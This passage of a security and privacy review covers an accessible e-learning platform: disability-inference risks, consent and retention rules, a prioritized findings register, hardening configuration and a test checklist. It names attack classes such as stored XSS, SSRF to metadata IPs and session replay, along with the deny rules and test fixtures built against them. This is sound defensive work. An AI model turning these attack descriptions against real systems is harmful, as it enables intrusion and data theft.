### 6.1 The core privacy hazard: assistive usage *is* sensitive data
Selecting EthSL video, enabling a Braille profile, or toggling audio description **implies disability status** without ever storing a diagnosis. The plan correctly moves this to "functional format preferences" — but three residual inference paths remain:

| Residual path | Leak mechanism | Mitigation |
| :--- | :--- | :--- |
| Format-preference telemetry | If prefs are synced server-side or included in analytics events, they form a per-user disability-inference record | Keep prefs **client-side only** (localStorage, already planned for the Web Component). If server sync is ever needed: store as opaque hashed profile, aggregate with k-anonymity (k ≥ 50) for analytics, never include in per-user analytics events |
| Screen-reader fingerprinting | `User-Agent` + feature-detection headers identify NVDA/TalkBack users in standard access logs | Scrub `User-Agent` from application logs (or hash it); never log `sec-ch-ua` hints that identify AT; note that many AT browsers already reduce fingerprint surface |
| Progress/interaction patterns | Keystroke cadence, pause patterns, replay timing are behavioral signatures tied to a person | Retention cap (30 days, then aggregate-only); never export per-session behavioral traces; include in the data-retention register (§6.4) |

### 6.2 EthSL recordings and Amharic audio: biometric-adjacent content
Sign-language video identifies the interpreter's face, hands, and signing style; Amharic voice audio is voice-biometric data under GDPR Art. 9-adjacent interpretations and under Ethiopia's Personal Data Protection Proclamation No. 1321/2024. The plan's interpreter/co-designer consent gate is necessary but incomplete:
- **Consent must be revocable with takedown:** define the publish-state reverse transition (`published → withdrawn`) and asset deletion SLA (≤ 72 h across CDN caches). One-click takedown for the interpreter, zero re-authentication friction.
- **Never run face/identity analysis** on sign recordings (add an explicit prohibition to the worker policy — AI vendors must not process sign video for identification).
- **Third-party AI vendors must never receive sign video or Amharic audio** unless a DPA covers it with zero-retention and no-training clauses (feeds open Q4 — this materially strengthens the case for self-hosted Whisper, which also solves the low-bandwidth constraint).
- Strip EXIF/GPS from all media at ingest (already planned — extend to sidecar metadata in caption files).

### 6.3 Consent records: sensitive by content, sensitive by existence
A record that learner X consented to "share lesson context during human support handover" reveals disability-adjacent context. Therefore:
- Consent records are encrypted at rest, access-controlled (Publisher + audit roles only), and retained **no longer than the content they cover + legal minimum**.
- Consent state changes are append-only audited (hash-chained, §4.9).
- **Deletion path (GDPR Art. 17):** a one-form, plain-language bilingual data-deletion request flow, reachable without login friction and operable with a screen reader (proper labels, no CAPTCHA, no puzzle). Confirmation via the existing magic-link flow (accessible and phishing-resistant enough for a low-assurance flow).
- Consent UI: the plan's `role="switch"` + bilingual plain-language + prerecorded audio pattern is excellent — keep it, and add: consent toggles must be reachable in ≤ 3 Tab stops from the privacy entry point, and every "off" action must be a single activation (no guilt-friction modals — dark-pattern avoidance is an accessibility requirement here).

### 6.4 Data-retention register (add to the plan)
The plan specifies no retention periods. Add a register (suggested values):

| Data | Retention | Notes |
| :--- | :--- | :--- |
| Operational logs (correlation IDs, roles) | 30 days | Then aggregate-only counters |
| Pseudonym bridge (correlation → user) | 30 days | Access-controlled, audit-logged |
| Learner progress events | Duration of enrollment + 90 days | Then anonymized aggregates |
| Consent records | Content lifetime + legal minimum | Revocable, audited |
| Draft caption/editorial revisions | Until version superseded + 30 days | Contains staff names in authorship metadata — minimize |
| Format preferences (server, if ever) | Session-scoped or device-scoped only | Prefer client-side only |
| Sign recordings / audio | Until withdrawn by interpreter or version superseded | Takedown SLA ≤ 72 h |

### 6.5 Cross-border and third-party exposure
- **Savanna adapter context relay:** the plan says "minimal lesson/enrollment context" — make it enumerated: `course_id`, `lesson_id`, `course_version_id`, `enrollment: bool`. **Never** pass accessibility-need flags, preferred formats, or accommodation status across the boundary, even if Savanna offers them.
- **Certificate verifier:** real certificate URLs expose course enrollment publicly. Rate-limit, `noindex`, uniform responses (§4.1), and never add a directory/listing of certificates.
- **Analytics:** if any analytics is added, it must be first-party, cookieless, aggregate-only (k ≥ 50), and never keyed by format preferences. No third-party trackers anywhere — this is both a privacy control and a WCAG-adjacent performance win on 400 kbps links.

### 6.6 What the plan already gets right (keep)
Zero-diagnosis storage, functional-prefs-only, zero-PII offline packs, zero-PII logs, bilingual plain-language consent UI, prerecorded audio consent summaries, chat-log redaction gate before `approved`, interpreter/co-designer consent for publication. These are the strongest sections of the plan.

---

## 7. Accessibility-Preserving Security Controls (Tension Matrix)

Every added control from §4/§8, checked against the assistive-technology constraint:

| Control | AT risk if done naively | Accessibility-preserving form |
| :--- | :--- | :--- |
| Text-node-only rendering (R-01) | None — `textContent` announces identically or better than innerHTML rendering | Adopt fully; if rich markup is ever needed, micro-iframe with `title` + `role` for SR navigation |
| Short pre-signed URL TTLs (R-02) | Mid-lesson stream stall on a 400 kbps link | Adapter refreshes URLs *before* expiry during active playback (already planned as D-09 refresh); stall-free by design |
| Rate limiting (D-08/R-06) | 429 loops are incomprehensible for SR users; CGNAT false lockouts | Per-user primary limits; 10× per-IP ceiling; `Retry-After` + bilingual plain-language body; **throttle, never lockout** (SC 2.2.1) |
| Uniform 404/403 errors (R-04) | Generic security errors can hide *what to do next* | The planned bilingual error schema says what happened + the recovery action ("ask your teacher / contact support"), which preserves both security uniformity and usability |
| Signed packs (R-08) | Signature failure could dead-end an offline learner | On failure: keep serving the last valid cached version (already planned for SW), show an accessible inline notice with a one-click re-download; never a dead end |
| OTP attempt cap (D-07) | Lockout punishes slow motor/AT input | Cap attempts per *code*, not per user-hour; progressive delay; passkey-first deletes the surface entirely |
| Magic links (R-13) | Email inbox navigation is a common SR workflow | Single-use, 10-min expiry keeps the flow simple; link text should be a large, first-focus target; Amharic + English body |
| Session cap + rotation (R-03) | Re-auth mid-lesson is the exact harm the plan exists to avoid | Cap at 12 h (a full study day) with the planned 2-min accessible warning + 10× extension; rotation is invisible |
| Two-person integrity (C-1) | None (staff-side only) | Adds no learner-facing friction |
| Revocation propagation (§4.1) | A revoked learner needs a *clear* reason | Bilingual fail-closed callout: "Your enrollment has changed — contact support" (plain language, no jargon) |
| Cookie strategy fix (R-10) | None directly | Ensures SSO return works — a broken SSO return *is* an accessibility failure (user locked out of the console) |
| Trusted Types / CSP (R-01) | Trusted Types can break dynamic text insertion patterns | Adopt in the component with `textContent`-based patterns (compliant by construction); test with NVDA/TalkBack before enabling on host pages |
| Pack-hash verification (R-08) | Hash failures could block a low-bandwidth learner from content | Automatic verify (no user action); silent fallback to last valid version; visible only in the planned ARIA polite status region |

**Net assessment:** no added control degrades the accessibility posture. Two (throttle-not-lockout, uniform-but-actionable errors) *improve* it.

---

## 8. Prioritized Findings Register

| ID | Severity | Likelihood | Finding | Effort | First action |
| :-- | :--- | :--- | :--- | :--- | :--- |
| R-01 | High | Medium | Stored XSS in player content runs at Savanna origin (no iframe isolation) | M | `textContent`-only rendering + authoritative ingest sanitizer + push Savanna for CSP |
| R-02 | High | Medium | Pre-signed URL leakage (Referer, sharing, caching) | S | TTL ≤ 300 s, `no-store`, `no-referrer` on asset hops |
| R-03 | High | Medium | Indefinite session extension via synthetic activity + silent refresh | M | Adapter-only refresh arbitration, 12 h cap, rotation + reuse detection |
| R-04 | High | Medium | Export-job IDOR leaks unapproved drafts | S | UUIDv4 IDs, owner check, uniform 404, content-free job responses |
| R-05 | Med-High | Low-Med | SSRF via DAISY/PDF/AI workers | M | Disable XML entities, egress allowlist proxy, metadata-range deny |
| R-06 | Med-High | High (CGNAT) | Per-IP rate limits → mass false lockouts | S | Per-user primary, 10× per-IP, throttle-not-lockout |
| R-07 | Medium | Medium | Progress replay = completion fraud | M | Server-observed-asset attestation for completion |
| R-08 | Medium | Low-Med | Offline pack tampering (integrity ≠ authenticity) | M | Ed25519-signed manifests, PWA-pinned key |
| R-09 | Medium | Medium | Disability inference via telemetry/UA logging | S | Client-side prefs only, scrub UAs, k-anonymity analytics |
| R-10 | Medium | High | `SameSite=Strict` breaks SSO return | S | Lax callback cookie / POST-message handoff (§9.4) |
| R-11 | Low-Med | Low | Launch-token forwarding on protected embeds | S | `jti` replay cache, short TTL, origin-bound `aud` |
| R-12 | Low-Med | Medium | OpenAPI/docs exposure, debug artifacts | S | Gate `/docs`, disable debug in prod |
| R-13 | Low-Med | Low | Magic-link replay / host-header link poisoning | S | Single-use, allowlisted link base, revoke on password change |
| R-14 | Low-Med | Medium | Unmaintained `bleach`; Liblouis/ffmpeg CVE surface | M | `nh3`, SBOM + digest pinning, sandboxed non-root workers |
| R-15 | Low | Low | Verifier ID enumeration | S | Uniform responses, rate limit, `noindex` |

**Implementation order:** R-10 and R-06 and R-02 (small fixes, day one) → R-04, R-12 (small) → R-01, R-03 (design-level, before first learner-facing deploy) → R-05, R-08 (before cloud/offline GA) → R-07, R-09, R-11, R-13, R-14, R-15 (before production lock-in).

---

## 9. Concrete Controls (Configuration-Level Additions)

### 9.1 HTTP security headers (our origins; request the same baseline from ALX for host pages)

```http
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
  img-src 'self' data:; media-src 'self' https://media.<our-domain>;
  connect-src 'self' https://api.<our-domain>; object-src 'none'; base-uri 'none';
  frame-ancestors 'self'; form-action 'self'; upgrade-insecure-requests
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin   # on asset routes: no-referrer
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), interest-cohort=()
Cache-Control: private, no-store                   # on all authorized/asset responses
```

For the Savanna host page (negotiate via open Q1/Q2): no `unsafe-inline` scripts, Trusted Types enabled (`require-trusted-types-for 'script'`), and `frame-ancestors` limiting who may embed. The component's `textContent`-based rendering is Trusted-Types-compliant by construction.

### 9.2 Storage & API hardening
- Two **physically separate** buckets (`draft`, `published`); account-level public-access block; SSE-AES256; versioning on.
- Pre-signed URL TTL: 300 s stream / 60 s refresh; bind tokens to `lesson_id + course_version_id` (already planned) and record issuance so completion attestation (§4.6) can reference server-observed fetches.
- Export jobs: UUIDv4 IDs; `404` (never `403`) for foreign jobs; response carries status + correlation ID only.
- Worker DB role: `GRANT UPDATE (status, updated_at) ON export_jobs TO worker_jobs;` — no SELECT on consent/credential tables, no DELETE.

### 9.3 Rate-limit policy (CGNAT-aware, accessibility-preserving)
| Surface | Per-user | Per-IP | Response |
| :--- | :--- | :--- | :--- |
| Auth/OTP/refresh | 5/min, progressive delay | 10× user ceiling | 429 + `Retry-After` + bilingual body |
| Export job creation | 10/hour | 10× | 429 + `Retry-After` |
| Manifest/asset fetch | 120/min | 10× | 429 + `Retry-After` |
| Verifier | — | 60/min/ID + 300/min/IP | Uniform responses, `noindex` |
No permanent lockouts anywhere (SC 2.2.1); throttled users get a plain-language bilingual explanation.

### 9.4 Session & token parameters
- Learner access token ≤ 1 h (as planned) **plus** absolute session cap 12 h; refresh only from the adapter, driven by server-observed activity; refresh-token rotation with reuse detection → revoke family.
- Staff cookie: `HttpOnly; Secure; SameSite=Lax` on the IdP-callback cookie (Strict breaks OIDC redirects), `Strict` for console session thereafter, or a POST-message continuation; CSRF token on all mutating console routes (autosave included).
- Logout/password-change/email-change → server-side revocation of session + refresh family; `Clear-Site-Data: "cookies", "storage"` on console logout.

### 9.5 Adapter hardening
- Token-mint endpoint: `Origin`/`Sec-Fetch-Site` allowlist + per-session CSRF token; one token per launch (`jti`); `aud` = our API origin; TTL ≤ 15 min.
- Login-return URL on the fail-closed callout: allowlist to Savanna origins only (open-redirect sink).
- Client-supplied identity claims (enrollment IDs, user IDs) rejected everywhere — extend the `body.signed_in` rule to all client identity input.

### 9.6 Offline packs & workers
- Ed25519 signature over canonical `manifest.json`; public key pinned in the PWA; verify **before rendering any pack HTML**; on failure keep the last valid cached version (already planned) + accessible one-click re-download notice.
- Pack hosting HTTPS-only; keep pack listing unlisted; rate-limit pack downloads.
- Worker containers: non-root, `no-new-privileges`, dropped capabilities, seccomp default, read-only rootfs, memory/CPU caps, egress allowlist proxy (vendor + package mirror), metadata/RFC1918 ranges denied, IMDSv2.

### 9.7 Logging, alerting, audit
- Security event stream (§4.9) with alerts: draft-path learner access (immediate), refresh-token reuse (immediate), IDOR sweep pattern, verifier enumeration, publish-without-quorum.
- Pseudonym bridge table (`correlation_id → user_id`), 30-day TTL, access-controlled, audit-logged — resolves the plan's zero-PII-vs-incident-response tension.
- Consent + review-state transitions: append-only, hash-chained.

### 9.8 Demo/production isolation
- DEMO credentials in a separate schema/database with a startup guard refusing to serve demo data from production routes (R-15/D-24 follow-through).

---

## 10. Recommendations on the Plan's Seven Open Questions

Conditional guidance pending ALX confirmation — each option below is the security-preferred default that does not regress accessibility:

1. **Identity contract (Node 9):** Prefer a **server-to-server introspection endpoint** or **LTI 1.3 launch with signature validation**. Avoid a shared Redis/session store across the trust boundary (couples blast radius). If LTI: validate signatures, timestamps, and audience; treat claims as untrusted until verified.
2. **Deployment topology:** Prefer a **subdomain of Savanna** for the API (same parent domain keeps `SameSite=Lax` delegation simple and avoids cross-site cookie loss on mobile browsers). Do **not** set `Domain=` cookie attributes broadly; keep cookie scoping minimal. A separate-domain deploy is viable but requires the server-to-server proxy and adds the launch-token surface — more moving parts for a hackathon timeline.
3. **Staff IdP:** Prefer a **dedicated passkey-first service** in the FastAPI backend (full control over WebAuthn UX, recovery, and accessible flows) with optional federation to ALX OIDC later. Recovery = admin-assisted re-enrollment, never security questions (NIST 800-63B; WCAG 3.3.8).
4. **AI vendor:** Prefer **self-hosted Whisper** — it resolves privacy (audio is biometric-adjacent), bandwidth, and vendor-retention unknowns in one decision, and the human-review gate already covers quality. If a vendor is mandatory: DPA + zero-retention + no-training + regional processing; never send sign video to any vendor (§6.2).
5. **Independent website scope:** For Level 1, ship **public demo lessons only** and defer the launch-token flow. It removes an entire attack surface (R-11) with zero accessibility cost. Implement the token flow only when a concrete protected-embed requirement exists.
6. **Chat replay ingestion:** Prefer **static ingestion through the staff console** — it keeps the redaction gate (§4.3 of the plan) enforceable and avoids a dynamic-fetch SSRF/PII surface (§4.10). Dynamic provider fetch should be a last resort behind an egress allowlist.
7. *(Implied from §6.4)* **Adopt the data-retention register** in the plan before production lock-in — retention is the missing half of the privacy pillar.

---

## 11. Additions to the Verification Gate Checklist (plan §6)

Append these checks to the existing five:

6. **Negative access tests:** learner-role token must receive uniform `404` on every draft path, every foreign export-job ID, and every revoked-enrollment manifest; assert no stack traces or bucket names in any error body.
7. **XSS regression corpus:** a fixture set of malicious caption/transcript/chat payloads (event handlers, `javascript:` URIs, mXSS strings, malformed WebVTT blocks) must render as inert text in the component under NVDA and TalkBack; verify zero `innerHTML`/`insertAdjacentHTML`/`dangerouslySetInnerHTML` in the component codebase via CI grep.
8. **Rate-limit UX test:** trigger a 429 deliberately under NVDA and TalkBack; verify the bilingual plain-language message, `Retry-After` behavior, and that throttling (not lockout) is applied. Simulate CGNAT (many users, few IPs) to confirm no false lockouts.
9. **Session-attack tests:** synthetic activity emission must NOT extend the session beyond the 12 h cap; refresh-token reuse must revoke the family; logout must invalidate the token server-side (verify with a replayed token).
10. **Pack authenticity test:** tamper one byte in a downloaded pack → PWA must refuse to render, keep the last valid version, and present the accessible re-download path; verify the Ed25519 signature check fires before any pack HTML is rendered.
11. **SSRF test:** submit lesson documents containing XML entities, metadata IPs, and internal URLs; assert workers never egress to non-allowlisted destinations (verify via egress-proxy logs).
12. **Privacy telemetry audit:** confirm access logs contain no `User-Agent`-derived AT fingerprint data, no format-preference values, and no per-user behavioral traces; confirm consent-record deletion completes end-to-end (DB + storage + caches) with an accessible confirmation flow.
13. **Separation-of-duties test:** attempt Author-self-review and Reviewer-self-publish transitions via the API; both must be rejected and audit-logged.

---

## 12. Residual Risk Statement

After implementing the register (§8), the residual risk profile is:

- **Accepted:** credential stuffing against Savanna's own login remains ALX-side (outside our boundary — coordinate via open Q1/Q2); a fully compromised ALX staff SSO or a Savanna-side breach is out of scope; theoretical mXSS in future rich-text features is mitigated but not eliminated (micro-iframe policy applies when rich text is added).
- **Managed to Low:** draft exfiltration (physical split + negative tests + alerting), session theft persistence (cap + rotation + revocation), SSRF (egress allowlist + entity-free XML), completion fraud (attestation), pack tampering (signatures).
- **Design tension consciously accepted:** silent-refresh + long lessons vs. session caps is balanced at 12 h absolute with invisible rotation — the correct trade for this user base.

The architecture's privacy pillars (zero-diagnosis, functional prefs, zero-PII artifacts) are sound and survive the identified attack chains once §8–§9 controls land. **Recommendation: approve the plan, adopt the register, and resolve open questions 1–4 before the first learner-facing deployment.**

---

*End of review. Companion artifact: `docs/security_architecture_plan.md` (v2.0) — this review adds §8/§9/§11 items to it rather than replacing any existing control.*
